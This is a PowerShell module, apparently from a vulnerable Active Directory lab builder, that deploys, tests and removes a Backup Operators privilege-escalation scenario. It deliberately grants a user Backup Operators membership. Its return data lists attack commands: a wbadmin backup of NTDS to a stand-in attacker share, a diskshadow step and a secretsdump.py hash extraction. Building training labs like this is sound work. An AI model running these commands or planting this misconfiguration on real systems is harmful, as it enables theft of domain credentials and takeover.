#Requires -Modules ActiveDirectory
<#
.SYNOPSIS
    Deploys Backup Operators privilege escalation scenario.
.DESCRIPTION
    Creates a user assigned to the built-in Backup Operators group to demonstrate
    directory database extraction vectors.
#>

function Deploy-BackupOperators {
    [CmdletBinding()]
    param(
        [string]$Difficulty = 'Medium',
        [string]$DomainDN,
        [string]$Domain
    )

    Write-VulnStatus -Message "Deploying Backup Operators Scenario..." -Type Info

    $password = Get-VulnPassword -Difficulty $Difficulty -Index 12
    $user = New-VulnUser -SamAccountName 'w.chen' -Name 'William Chen' -Password $password -DomainDN $DomainDN -Description 'IT Infrastructure Specialist'

    try {
        Add-ADGroupMember -Identity 'Backup Operators' -Members 'w.chen' -ErrorAction Stop
        Write-VulnStatus -Message "Added w.chen to Backup Operators group." -Type Success
    } catch {
        Write-VulnStatus -Message "Failed to add w.chen to Backup Operators: $_" -Type Warning
    }

    Write-VulnResult -Name 'Backup Operators User' -Detail 'w.chen added to Backup Operators' -Success $true -IsLast

    return @{
        Scenario       = 'BackupOperators'
        Description    = 'User in Backup Operators group capable of reading sensitive system files'
        CreatedObjects = @('w.chen')
        AttackCommands = @(
            'wbadmin start backup -backuptarget:\\attacker\share -include:C:\Windows\NTDS',
            'diskshadow (shadow copy C: then extract ntds.dit)',
            'secretsdump.py -ntds ntds.dit -system system.hive LOCAL'
        )
        AttackPath     = 'w.chen (Backup Operators) -> Extract NTDS.dit/SYSTEM -> Domain Admin Hashes'
        MitreID        = 'T1003.003'
        Difficulty     = $Difficulty
    }
}

function Remove-BackupOperators {
    [CmdletBinding()]
    param([string]$DomainDN)

    try {
        Remove-ADGroupMember -Identity 'Backup Operators' -Members 'w.chen' -Confirm:$false -ErrorAction SilentlyContinue
        Remove-ADUser -Identity 'w.chen' -Confirm:$false -ErrorAction SilentlyContinue
        Write-VulnStatus -Message "Removed Backup Operators scenario objects." -Type Success
    } catch {
        Write-VulnStatus -Message "Cleanup error: $_" -Type Warning
    }
}

function Test-BackupOperators {
    [CmdletBinding()]
    param([string]$DomainDN)

    $u = Get-ADUser -Filter "samAccountName -eq 'w.chen'" -ErrorAction SilentlyContinue
    if ($u) {
        $groups = Get-ADPrincipalGroupMembership -Identity 'w.chen' | Select-Object -ExpandProperty Name
        return ('Backup Operators' -in $groups)
    }
    return $false
}
